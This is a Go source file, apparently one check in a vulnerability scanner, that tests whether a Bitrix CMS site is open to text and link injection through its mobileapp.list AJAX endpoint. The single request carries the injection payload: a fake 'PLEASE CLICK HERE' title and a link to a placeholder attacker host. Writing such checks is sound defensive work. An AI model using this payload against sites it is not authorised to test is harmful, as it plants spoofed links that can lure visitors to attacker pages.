// Package spoofing provides function to check if target is vulnerable to spoofing attack.
package spoofing

import (
	"io"
	"net/http"
	"strings"
)

const (
	endpoint1 = "/bitrix/components/bitrix/mobileapp.list/ajax.php?" +
		"items[1][TITLE]=TEXT+INJECTION!+PLEASE+CLICK+HERE!&items[1][DETAIL_LINK]=https://attaker.example"
)

func Detect(target string) (string, error) {

	url := target + endpoint1
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}

	if resp.StatusCode == 200 {
		body, _ := io.ReadAll(resp.Body)
		if len(body) != 0 {
			if strings.Contains(string(body), "TEXT INJECTION! PLEASE CLICK HERE") {
				return url, nil
			}
		}
	}
	return "", nil
}
